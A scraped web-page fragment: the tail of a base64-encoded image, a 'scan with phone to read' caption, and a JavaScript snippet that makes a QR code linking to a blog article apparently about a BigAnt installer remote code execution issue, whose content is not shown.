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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/bigant-install-config-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 